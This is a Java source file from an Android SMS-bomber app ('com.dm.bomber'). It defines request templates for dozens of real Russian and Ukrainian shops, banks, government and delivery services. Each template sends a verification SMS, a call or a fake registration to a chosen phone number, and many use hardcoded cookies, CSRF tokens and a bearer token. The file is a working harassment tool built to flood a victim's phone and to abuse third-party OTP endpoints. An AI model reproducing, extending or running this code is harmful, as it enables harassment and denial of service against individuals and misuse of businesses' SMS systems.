package com.dm.bomber.services;

import androidx.annotation.NonNull;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;

import okhttp3.Call;
import okhttp3.FormBody;
import okhttp3.HttpUrl;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class Services {

    private static boolean contains(final int[] array, final int key) {
        for (final int i : array) {
            if (i == key) {
                return true;
            }
        }
        return false;
    }

    public static List<Service> getUsableServices(String countryCode) {
        List<Service> usableServices = new ArrayList<>();

        int countryCodeNum = countryCode.isEmpty() ? 0 : Integer.parseInt(countryCode);
        for (Service service : services) {
            if (service.countryCodes == null || service.countryCodes.length == 0 || contains(service.countryCodes, countryCodeNum))
                usableServices.add(service);
        }

        return usableServices;
    }

    public final static Service[] services = new Service[]{
            new Telegram(), new Tele2TV(),
            new Ukrzoloto(), new Olltv(), new ProstoTV(), new Groshivsim(),
            new Dolyame(), new Tinkoff(), new Gosuslugi(), new Multiplex(), new Evotor(), new MosMetro(), new BCS(),
            new Uchiru(), new Biua(), new MdFashion(), new RiveGauche(),
            new XtraTV(), new AlloUa(), new Rulybka(),
            new Technopark(), new Call2Friends(),
            new BeriZaryad(), new Labirint(), new SatUa(),
            new Melzdrav(), new Fonbet(), new Grilnica(),
            new Soscredit(), new ChernovtsyRabota(), new Eva(), new Apteka(),

            new ParamsService("https://findclone.ru/register") {
                @Override
                public void buildParams(HttpUrl.Builder builder) {
                    builder.addQueryParameter("phone", getFormattedPhone());
                }
            },

            new FormService("https://polza.diet/sessions", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("utf8", "✓");
                    builder.add("authenticity_token", "RDB0iQ+dXYBLIvabyeAnf2fYEYnaMoMwINvwl/CS6HRz467tucU+kT6I7QTl7aWebeX8Gqtg48NYUUif1NJL9g==");
                    builder.add("phone", format(phone, "+7+(***)+***+**+**"));
                }
            },

            new FormService("https://shop.vodovoz-spb.ru/bitrix/tools/ajax_sms.php", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("phone", format(phone, "+7 (***) ***-**-**"));
                }
            },

            new FormService("https://chuck-family.ru/s/get-registration-confirm-code.json", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("register_phone", format(phone, "8+***-***-**-**"));
                    builder.add("register_name", getRussianName());
                    builder.add("register_birthday", "01.01.1981");
                    builder.add("", "");
                }
            },

            new ParamsService("https://vsem-edu-oblako.ru/singlemerchant/api/sendconfirmationcode", 7) {
                @Override
                public void buildParams(HttpUrl.Builder builder) {
                    builder.addQueryParameter("lang", "ru");
                    builder.addQueryParameter("json", "true");
                    builder.addQueryParameter("merchant_keys", "b27447ba613046d3659f9730ccf15e3c");
                    builder.addQueryParameter("device_id", "f330883f-b829-41df-83f5-7e263b780e0e");
                    builder.addQueryParameter("device_platform", "desktop");
                    builder.addQueryParameter("phone", format(phone, "+7 (***) ***-**-**"));
                }
            },

            new FormService("https://novayagollandiya.com/auth/?backurl=/personal/", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("component", "bxmaker.authuserphone.login");
                    builder.add("sessid", "624313ea9d90eac9093d49000c8e2dbf");
                    builder.add("method", "sendCode");
                    builder.add("phone", format(phone, "+7+(***)-***-**-**"));
                    builder.add("registration", "N");
                }
            },

            new JsonService("https://api.sunlight.net/v3/customers/authorization/") {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://www.letu.ru/s/api/user/account/v1/confirmations/phone?pushSite=storeMobileRU", 7) {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("captcha", "");
                        json.put("phoneNumber", format(phone, "+7 (***) ***-**-**"));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://cnt-vlmr-itv02.svc.iptv.rt.ru/api/v2/portal/send_sms_code") {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("session_id", "24f8bbf7-60d3-11ec-b71d-4857027601a0:1951416:2237006:2");
                    return super.buildRequest(builder);
                }

                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("action", "register");
                        json.put("phone", getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new Service(7) {
                @Override
                public void run(OkHttpClient client, Callback callback) {
                    String formattedPhone = format(phone, "+7 (***) ***-**-**");

                    client.newCall(new Request.Builder()
                            .url("https://madrobots.ru/api/auth/register/")
                            .post(new FormBody.Builder()
                                    .add("name", getRussianName())
                                    .add("lastName", getRussianName())
                                    .add("phone", formattedPhone)
                                    .add("email", getEmail())
                                    .add("city", getRussianName())
                                    .add("subscribe", "0")
                                    .build())
                            .build()).enqueue(new okhttp3.Callback() {
                        @Override
                        public void onFailure(@NonNull Call call, @NonNull IOException e) {
                            callback.onFailure(call, e);
                        }

                        @Override
                        public void onResponse(@NonNull Call call, @NonNull Response response) {
                            client.newCall(new Request.Builder()
                                    .url("https://madrobots.ru/api/auth/send-code/")
                                    .post(new FormBody.Builder()
                                            .add("identifier", formattedPhone)
                                            .build())
                                    .build()).enqueue(callback);
                        }
                    });
                }
            },

            new Service(380) {
                @Override
                public void run(OkHttpClient client, Callback callback) {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("msisdn", getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    client.newCall(new Request.Builder()
                            .url("https://mnp.lifecell.ua/mnp/get-token/")
                            .post(RequestBody.create(json.toString(), MediaType.parse("application/json")))
                            .build()).enqueue(new okhttp3.Callback() {
                        @Override
                        public void onFailure(@NonNull Call call, @NonNull IOException e) {

                        }

                        @Override
                        public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                            try {
                                JSONObject req = new JSONObject(Objects.requireNonNull(response.body()).string());

                                JSONObject json = new JSONObject();
                                json.put("contact", getFormattedPhone());
                                json.put("otp_type", "standart");

                                client.newCall(new Request.Builder()
                                        .url("https://mnp.lifecell.ua/mnp/otp/send/")
                                        .header("authorization", "Token " + req.getString("token"))
                                        .post(RequestBody.create(json.toString(), MediaType.parse("application/json")))
                                        .build()).enqueue(callback);

                            } catch (JSONException | NullPointerException e) {
                                callback.onError(e);
                            }
                        }
                    });
                }
            },

            new FormService("https://uss.rozetka.com.ua/session/auth/signup-phone", 380) {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("Cookie", "ab-cart-se=new; xab_segment=123; slang=ru; uid=rB4eDGHMb00wHeQls7l4Ag==; visitor_city=1; _uss-csrf=zfILVt2Lk9ea1KoFpg6LVnxCivNV1mff+ZDbpC0kSK9c/K/5; ussat_exp=1640830991; ussat=8201437cececef15030d16966efa914d.ua-a559ca63edf16a11f148038356f6ac94.1640830991; ussrt=6527028eb43574da97a51f66ef50c5d0.ua-a559ca63edf16a11f148038356f6ac94.1643379791; ussapp=u3-u_ZIf2pBPN8Y6oGYIQZLBN4LUkQgplA_Dy2IX; uss_evoid_cascade=no");
                    builder.addHeader("Csrf-Token", "zfILVt2Lk9ea1KoFpg6LVnxCivNV1mff+ZDbpC0kSK9c/K/5");

                    return super.buildRequest(builder);
                }

                @Override
                public void buildBody(FormBody.Builder builder) {
                    String name = getRussianName();

                    builder.add("title", name);
                    builder.add("first_name", name);
                    builder.add("last_name", getRussianName());
                    builder.add("password", getUserName() + "A123");
                    builder.add("email", getEmail());
                    builder.add("phone", phone);
                    builder.add("request_token", "rB4eDGHMb00wHeQls7l4Ag==");
                }
            },

            new FormService("https://happywear.ru/index.php?route=module/registerformbox/ajaxCheckEmail", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("email", getEmail());
                    builder.add("telephone", format(phone, "7(***)***-**-**"));
                    builder.add("password", "qVVwa6QwcaCPP2s");
                    builder.add("confirm", "qVVwa6QwcaCPP2s");
                }
            },

            new ParamsService("https://www.sportmaster.ua/?module=users&action=SendSMSReg", 380) {
                @Override
                public void buildParams(HttpUrl.Builder builder) {
                    builder.addQueryParameter("phone", getFormattedPhone());
                }
            },

            new FormService("https://yaro.ua/assets/components/office/action.php", 380) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("action", "authcustom/formRegister");
                    builder.add("mobilephone", getFormattedPhone());
                    builder.add("pageId", "116");
                    builder.add("csrf", "b1618ecce3d6e49833f9d9c8c93f9c53");
                }
            },

            new JsonService("https://api.01.hungrygator.ru/web/auth/webotp", 7) {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("userLogin", format(phone, "+7 (***) ***-**-**"));
                        json.put("fu", "bar");
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new FormService("https://feelka.kz/profile/login/send") {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("Cookie", "user_hash=ffc14dcb317a5b139628375691cdac011d57031e7d11202e9653dba1be0b5b9ca%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22user_hash%22%3Bi%3A1%3Bs%3A32%3A%22d423303a4450353ff218a06c6537ec31%22%3B%7D; city_id=77ad4b65fd4265fc1665cf2363f3dc0e2a04349899f28df8a539d41dfccc02e4a%3A2%3A%7Bi%3A0%3Bs%3A7%3A%22city_id%22%3Bi%3A1%3Bs%3A1%3A%221%22%3B%7D; city_folder=d9aef6fa22b07d343f480bd79d0327fcb82aa359e7c8ec3f5e5ba396b3c2ffbaa%3A2%3A%7Bi%3A0%3Bs%3A11%3A%22city_folder%22%3Bi%3A1%3Bs%3A0%3A%22%22%3B%7D");

                    return super.buildRequest(builder);
                }

                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("phone", getFormattedPhone());
                    builder.add("xhr", "e3f365d8e3c26bf23a783e3ef2284426b7cf54062d5198b7d82ebf29812159fd");
                }
            },

            new FormService("https://coffeemania.ru/login", 7) {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("Cookie", "advanced-frontend=249af0fec8eba234a5073a8b2b4b669c; usertoken=0dd71cf26a60cde974fccea7cbf4b1cc7fef6b42f5ae1a90931ab02a97f634f9a%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22usertoken%22%3Bi%3A1%3Bs%3A20%3A%22BUgLuZWPOYpqpTzfedEY%22%3B%7D; _csrf-frontend=8ec96385efe9d0b6692a0e20f48242093099e01e8c3e6421880f123f0c0c3c1aa%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22aHlaJkh2k2DM8fPsDxNfearHyYM7a-EF%22%3B%7D;");
                    builder.addHeader("X-CSRF-Token", "oRDK7RaJ4l1phEUjnxKBTVWBOMthFfRRMHQu12jdFrHAWKaMXOKKbwK2AW6ndNE-Efl2rQR0hhlJLWPgCfBT9w==");

                    return super.buildRequest(builder);
                }

                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("_csrf-frontend", "ErLX8KCUbLFIDYTf3Mc9ZA2mgNEXIC4iUNuFeTeFuxtz-ruR6v8EgyM_wJLkoW0XSd7Ot3JBXGopgshOVqj-XQ==");
                    builder.add("LoginForm[phone]", format(phone, "+7(***)***-**-**"));
                    builder.add("LoginForm[type]", "");
                }
            },

            new FormService("https://samurai.ru/local/ajax/login_reg.php", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("user_tel", format(phone, "+7 (***) ***-**-**"));
                    builder.add("user_password", getUserName());
                    builder.add("do", "reg");
                }
            },

            new FormService("https://sushiicons.com.ua/kiev/index.php?route=common/cart/ajaxgetcoderegister", 380) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("firstname", getRussianName());
                    builder.add("phone", format(phone, "+380 (**) ***-**-**"));
                    builder.add("birthday", "2005-03-05");
                }
            },

            new JsonService("https://ucb.z.apteka24.ua/api/send/otp") {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://mob-app.rolf.ru/api/v4/auth/register/request-sms-code") {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("accept-language", "uk");
                    builder.addHeader("accept-encoding", "gzip");
                    builder.addHeader("user-agent", "okhttp/3.14.9");

                    return super.buildRequest(builder);
                }

                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://e-solution.pickpoint.ru/mobileapi/17100/sendsmscode") {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("User-Agent", "Application name: pickpoint_android, Android version: 29, Device model: Mi 9T Pro (raphael), App version name: 3.9.0, App version code: 69, App flavor: , Build type: release");
                    builder.addHeader("Connection", "Keep-Alive");
                    builder.addHeader("Accept-Encoding", "gzip");

                    return super.buildRequest(builder);
                }

                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("PhoneNumber", getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://xn--80adjkr6adm9b.xn--p1ai/api/v5/user/start-authorization", 7) {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", format(phone, "+7 *** ***-**-**"));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new ParamsService("https://fe.dominospizza.ru/api/authentication/sendVerificationSms", "POST", 7) {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("authorization", "Bearer eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwidHlwIjoiSldUIn0.lk7imFwFM9_w7KDujmn0jxArTGubuk-GZOw2r-RGAGeV1BDiFJZJzQ.AFBzB-1QZo01LFVo-c1X6w.7YADNKglX4DWWqFyz09vl9ze0KySLLHiDvIiQYef02c_kmrDnFBmPKibAR5EVREzZRTmN4sJ6lFNwYLeMtOaqrNWyJGz3zcYoahvjcjB5B9mCfLcVX1ugbCvYpbimvACn4P613afErS_0VvShR8vsdv3T3z6q5qx3w9CmuDLkzUUnqJ8BvO8kafNQQsUhZ6vJBoxv6cLf4UKNzHwGFU84g6kx2aBP2jJV8H6bpzbRqRsGWKWxb46ZKW01Cs5-BesuhNN25euWpY4uwYkM0Lqz6UX9_Hu0b7cZyH6JOy_H_y6aHZm1mZdiWex_FSbIf6it2_oZgsRFQLMPRqwfl9JXeCLrtaXipbwUjrFvaOC3pnEgYZ_y0iiCgse_i1tneeHgwQm7sjM7qEskqLPkqXOe2rCqn3mjFtfMAw95nrOXPQQ38UqEAdWUvDJDh141WYLw-wLfKjONldE0b-dNk5coKeptItF-0abCWgq6s6giAs.JZ-M2bpaATtWYaLPm3-hqA");

                    return super.buildRequest(builder);
                }

                @Override
                public void buildParams(HttpUrl.Builder builder) {
                    builder.addQueryParameter("phoneNumber", phone);
                }
            },

            new ParamsService("https://c.ua/index.php?route=account/loginapples/sendSMS", 380) {
                @Override
                public void buildParams(HttpUrl.Builder builder) {
                    builder.addQueryParameter("route", "account/loginapples/sendSMS");
                    builder.addQueryParameter("phone", "0" + phone);
                }
            },

            new FormService("https://client.taximaxim.com/ru-RU/site/send-code/?tax-id=yFL33BWu8yOEhqH0C0bV8BfGWKFjFba7Sxdwcdfppe71sHd4uxidkbS5%2B%2BYzBsW%2BiAH1yXFh2Na5bJdvZaNNTNRa6w%2BY1xpwqd1XUGEIcJc%3D", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("_csrf", "kxA-oV0mlFWdBCIB7ILw3rimGOLKolF08U3T-xRAHODhR27nE3LDANN1Flmt27uT7tZVpqHsJhCmAJ-OLAMurw==");
                    builder.add("LoginForm[org]", "maxim");
                    builder.add("LoginForm[country]", "KZ");
                    builder.add("LoginForm[baseId]", "2647");
                    builder.add("LoginForm[phone]", format(phone, "+7(***)***-**-**"));
                    builder.add("LoginForm[code]", "");
                    builder.add("LoginForm[sendCodeType]", "0");
                }

                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("Cookie", "_gcl_au=1.1.1590444723.1644943405; ga4_ga=GA1.1.1194255158.1644943405; _fbp=fb.1.1644943405522.1545141459; tmr_lvid=240c8ea73522f433a343f40b415fe8da; tmr_lvidTS=1644943405689; _ga=GA1.2.1194255158.1644943405; _gid=GA1.2.856429364.1644943406; _gat=1; _ym_uid=1644943406270600745; _ym_d=1644943406; _ym_isad=2; _ym_visorc=w; TAXSEE_V3MAXIM=l3thvebia464dbs2koje0n3hgv; __finger_print_hash=6e47d4b191dc6ac30a1d7606a5fa7a7a72cb20cc9e0853935099d982901443b9a%3A2%3A%7Bi%3A0%3Bs%3A19%3A%22__finger_print_hash%22%3Bi%3A1%3Bs%3A32%3A%2264d178a6ae165b1da838d27d84a1e244%22%3B%7D; __intl=1a6c3f19d825211b4b399b7960038c6d1a93438adf1deb9825ed10de11d478f0a%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22__intl%22%3Bi%3A1%3Bs%3A5%3A%22ru-RU%22%3B%7D; _csrf=d92a7efa1c07f1ffe242d52d34c2845fc5430ca22a0a772cb9ff56f9528cb7faa%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22rWPFNTWUNq4XAYKMVpMDkNwdWMLu8C2O%22%3B%7D; ga4_ga_21NZZ0KWNK=GS1.1.1644943405.1.1.1644943408.57; tmr_reqNum=4");
                    builder.addHeader("X-CSRF-Token", "kxA-oV0mlFWdBCIB7ILw3rimGOLKolF08U3T-xRAHODhR27nE3LDANN1Flmt27uT7tZVpqHsJhCmAJ-OLAMurw==");

                    return super.buildRequest(builder);
                }
            },

            new Service(7) {
                @Override
                public void run(OkHttpClient client, Callback callback) {
                    client.newCall(new Request.Builder()
                            .url("https://api.pizzasan.ru/api/clients/do_register")
                            .post(RequestBody.create("------WebKitFormBoundaryVtaTywrDHtBorVsK\n" +
                                    "Content-Disposition: form-data; name=\"name\"\n" +
                                    "\n" +
                                    "\n" +
                                    "------WebKitFormBoundaryVtaTywrDHtBorVsK\n" +
                                    "Content-Disposition: form-data; name=\"phone\"\n" +
                                    "\n" +
                                    format(phone, "8(***) ***-****") +
                                    "\n------WebKitFormBoundaryVtaTywrDHtBorVsK\n" +
                                    "Content-Disposition: form-data; name=\"password\"\n" +
                                    "\n" +
                                    "1234567\n" +
                                    "------WebKitFormBoundaryVtaTywrDHtBorVsK\n" +
                                    "Content-Disposition: form-data; name=\"password_2\"\n" +
                                    "\n" +
                                    "1234567\n" +
                                    "------WebKitFormBoundaryVtaTywrDHtBorVsK--", MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundaryVtaTywrDHtBorVsK")))
                            .build()).enqueue(callback);
                }
            },

            new FormService("https://luckycosmetics.ru/index.php?route=module/smsverification/generate", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("phone", format(phone, "+7 (***) ***-**-**"));
                    builder.add("registered", "0");
                }

                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("Cookie", "PHPSESSID=43jda9rgnctmidr9s4skhdskr1; _lucky_ident=7cc59b449f01cc6473162f381817b842; _lucky_uid=19717157; _ga=GA1.2.440536502.1648574015; _gid=GA1.2.1766371184.1648574015; _gat=1; tmr_lvid=0db3fa1830a9673dcd291c816c94ff21; tmr_lvidTS=1648574015329; tmr_reqNum=3; _dc_gtm_UA-15256516-4=1; _fbp=fb.1.1648574015618.1527744418; _ym_uid=1648574016350694378; _ym_d=1648574016; _ym_isad=2; _ym_visorc=w; cto_bundle=Faosxl9EVnp3eW1hc29CWDhuNE95TmFkajFYNENVeVd0cndaeGdzaHR4OUFjNFhwNnVMSEhPcUF6bzc4WDNIUkxTeDc5dGRXMVZsSUZSTCUyRjRvMkp3TVF2MGROdVpCVDVnYk5MT2V6VThNVHQ2dHVSOE5aZlg5RkxGeVFKTnBjN2JaWE02bWN5YUplcUV5azlCYkIwYWZLcCUyQlNRJTNEJTNE; tmr_detect=0%7C1648574018130; language=ru; currency=RUB; banner_view=s1; banner_time=1648575819940");
                    builder.addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36 Edg/99.0.1150.550");
                    return super.buildRequest(builder);
                }
            },

            new FormService("https://www.kristall-shop.ru/ajaxer.php?x=personal", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("action", "sms_send");
                    builder.add("phone", format(phone, "+7 (***) ***-**-**"));
                    builder.add("csrf_token", "bf365b62acb4b358b42e38d45f060acf");
                }

                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("Cookie", "PHPSESSID=ksstkdlpk2qo7dgtcfjo6hup01; user_source=direct; user_id=24faa4ade96af13b1351fa01cd5b5a7b; user_type=client; city=1; _ga=GA1.2.2017371052.1648576559; _gid=GA1.2.1857337036.1648576559; _ym_uid=164857656046395673; _ym_d=1648576560; tmr_lvid=e8ab35ae3db9b36f8a001f6d153c8e62; tmr_lvidTS=1648576559651; _ym_isad=2; _ym_visorc=w; _lhtm_u=62432d0084bf4d7c0811aef7; _lhtm_r=direct|5fc5f2e04b0c685e1823b1e5; _fbp=fb.1.1648576560720.54969929; _ym_mailid=e9f2c96e4185b4e8fc4f10ce4b193ced; _gucid=fc4f10ce4b193cede9f2c96e4185b4e8; viewed_pages=2; cto_bundle=1gbT3193bGp5bXhncEU3NjJKQVlQcFp5VlZ0R1hKOEVmYURRaXowaWRjQ3NyMm9YWCUyRmVTQWV1YjNHREVPaEc4SmN5c3FtTmk3YjU5cmZMYmpuOGRvRFBXM3gwTzZ1cktnJTJGOXJ4RlM3eUk5dTNDWXBGRmglMkZLSVZvNTdYcnAlMkJOQjU5Tko1ekNXOVVOQkxhcVczdXNMV1I0WjNUUSUzRCUzRA; lh_widget_system_pages_counter=1; tmr_detect=0%7C1648576565533; tmr_reqNum=7");

                    return super.buildRequest(builder);
                }
            },

            new FormService("https://zvonok.com/api/demo/", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("csrfmiddlewaretoken", "IR473RdCuTdFJyh1O2PXgiiYrI6DNQFmHiagLFAXOsMlDMdh2DsxuZuEEeOT3kCs");
                    builder.add("type", "confirm");
                    builder.add("phone", format(phone, "+7 (***)***-**-**"));
                }
            },

            new FormService("https://yaponchik.net/login/login_.php", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("login", "Y");
                    builder.add("countdown", "0");
                    builder.add("step", "phone");
                    builder.add("redirect", "/profile/");
                    builder.add("phone", format(phone, "+7 (***) ***-**-**"));
                }

                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.header("x-requested-with", "XMLHttpRequest");

                    return super.buildRequest(builder);
                }
            },

            new FormService("https://luckycosmetics.ru/index.php?route=module/smsverification/createcode", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("phone", format(phone, "+7 ***-***-**-**"));
                    builder.add("registered", "0");
                }

                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.header("Cookie", "_ym_d=1648574016; _ym_uid=1648574016350694378; PHPSESSID=s81s1p6dhvtml4202c9ukipr04; _lucky_ident=f75be0590f0ff3f7fc98d875424a2916; _lucky_uid=20006300; tmr_lvid=0db3fa1830a9673dcd291c816c94ff21; tmr_lvidTS=1648574015329; _ga=GA1.2.1616716533.1651899862; _gid=GA1.2.952929180.1651899862; _gat=1; _dc_gtm_UA-15256516-4=1; cto_bundle=f2uhI19ZR1dsYjU2MXE3dFUyU3E1UXlPUm9mTWFPbzBicVg5Qk5VWWZkMDglMkY5RFhSVUFldmFzTkpqNUZlRGNVOUIlMkZyOW1LQmtDS1pocjdVMGpJQUpxcDRhOHRCWlZ3UDlOM2hOc3JuNHVDYyUyQlNzJTJGdmVNaGpkemZVNVlUTTNGbWRaNnY5MlNSaUU2eVJXZ3RSYSUyRmNSUGJ5NkZRJTNEJTNE; _ym_isad=2; _ym_visorc=w; tmr_detect=0%7C1651899865822; language=ru; currency=RUB; geoip_fias_id=3278; banner_view=s1; banner_time=1651901667823; tmr_reqNum=10");
                    builder.header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36 Edg/101.0.1210.32");
                    builder.header("X-Requested-With", "XMLHttpRequest");

                    return super.buildRequest(builder);
                }
            },

            new FormService("https://almazholding.ru/local/user1/sendcode.php") {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("PHONE", getFormattedPhone());
                    builder.add("ECAPTCHA", "undefined");
                }
            },

            new JsonService("https://severx.ru/api/auth/code") {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new ParamsService("https://my.hmara.tv/api/sign", 380) {
                @Override
                public void buildParams(HttpUrl.Builder builder) {
                    builder.addEncodedQueryParameter("contact", getFormattedPhone());
                    builder.addEncodedQueryParameter("deviceId", "81826091-f299-4515-b70f-e82fd00fec9a");
                    builder.addEncodedQueryParameter("language", "ru");
                    builder.addEncodedQueryParameter("profileId", "1");
                    builder.addEncodedQueryParameter("deviceType", "2");
                    builder.addEncodedQueryParameter("ver", "2.2.9");
                }

                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.header("Cookie", "_ga=GA1.2.641734216.1650994527; _gid=GA1.2.109748838.1650994527; _gat_gtag_UA_131143143_1=1; _fbp=fb.1.1650994527815.1351289375; _hjFirstSeen=1; _hjSession_1352224=eyJpZCI6IjQ4ZWY4YmFhLTBmZDMtNGE1Yy05NGNiLWUzNzUzMjY5YWI5ZiIsImNyZWF0ZWQiOjE2NTA5OTQ1MjgzNTIsImluU2FtcGxlIjp0cnVlfQ==; _hjAbsoluteSessionInProgress=0; _hjSessionUser_1352224=eyJpZCI6ImQwMjA0NjA2LWNjYWUtNTBmNi1hMmNjLTU5YzdhMDQ5MTQwNyIsImNyZWF0ZWQiOjE2NTA5OTQ1Mjc4NzEsImV4aXN0aW5nIjp0cnVlfQ==; _gat=1");

                    return super.buildRequest(builder);
                }
            },

            new FormService("https://www.banki.ru/ng/api/v1.0/public/auth/send-otp/") {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("phone", "+" + getFormattedPhone());
                    builder.add("isRulesAccepted", "true");
                    builder.add("isAdAccepted", "false");
                }

                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.header("Cookie", "_ym_uid=1648578272916533346; _ym_d=1648578272; __hash_=a0d590e952832dddd9d48a77d78ea03b; __lhash_=499667e103738417a3e13140337645ea; HO_SOURCE=seo_google; aff_sub3=main; _flpt_main_page_slider_vs_tile=main_page_slider_vs_tile_b; PHPSESSID=5a5dc1f54d0699c13ccd35dfa8a6a3e9; BANKI_RU_USER_IDENTITY_UID=7098436749189750240; _gid=GA1.2.1052824793.1651932173; ga_client_id=627096449.1651932173; tmr_lvid=44ad9df3ed1940bbb4428c5f37f111d8; tmr_lvidTS=1648578270747; _ym_visorc=b; _ym_isad=2; _gcl_au=1.1.144002483.1651932174; counter_session=1; gtm-session-start=1651932172319; _ga_MEEKHDWY53=GS1.1.1651932174.1.0.1651932174.60; _ga=GA1.1.627096449.1651932173; tmr_detect=0%7C1651932175295; user_region_id=4; tmr_reqNum=21; _ga_PG15GEX7CK=GS1.1.1651932174.1.1.1651932204.0");
                    builder.header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36 Edg/101.0.1210.32");

                    return super.buildRequest(builder);
                }
            },

            new JsonService("https://api-new.elementaree.ru/graphql") {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("operationName", "phoneVerification");
                        json.put("query", "mutation phoneVerification($phone: String!) {\n" +
                                "  phoneVerification(phone: $phone) {\n" +
                                "    success\n" +
                                "    interval\n" +
                                "    __typename\n" +
                                "  }\n" +
                                "}\n");

                        json.put("variables", new JSONObject()
                                .put("phone", getFormattedPhone()));

                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://admin.foodzo.ru/api/v2/users/send-code/phone", 7) {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("dest", format(phone, "+7(***)***-**-**"));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new FormService("https://www.shashlikof-fast.ru/local/templates/shashlikoff/ajax/formRequest.php", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("phone", phone);
                    builder.add("subscribe_agreement", "on");
                    builder.add("type", "auth-code-req");
                }
            },

            new FormService("https://beerlogapizza.ru/ajax/global_ajax.php") {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("character", "number");
                    builder.add("phone", phone);
                    builder.add("code", "");
                    builder.add("session_id", "e6ab56c6c97b3a47cdee0f60705a8561");
                }
            },

